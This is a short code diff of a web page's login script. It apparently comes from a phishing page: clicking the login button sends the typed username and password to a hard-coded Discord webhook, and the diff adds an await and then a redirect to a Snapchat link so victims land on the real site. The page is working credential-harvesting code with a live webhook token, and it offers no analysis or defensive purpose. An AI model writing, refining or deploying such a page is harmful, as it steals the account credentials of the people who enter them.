@@ -87,8 +87,8 @@
 const username = document.getElementById("username");
 const password = document.getElementById("password");
 
-loginTrigger.addEventListener("click", () => {
-	fetch(
+loginTrigger.addEventListener("click", async () => {
+	await fetch(
   'https://discord.com/api/webhooks/1103811946777682072/w4TAUPPyOO9WiOqoG96pqd0R_DFWYcOajnV4BpjuPh_aLVCkUHEzaclB-agLMXyv1qhd',
   {
     method: 'post',
@@ -118,6 +118,7 @@ loginTrigger.addEventListener("click", () => {
 }),
   }
 );
+	window.location.href = "https://t.snapchat.com/Hi2UHNuU"
 });
 </script>
 </body>
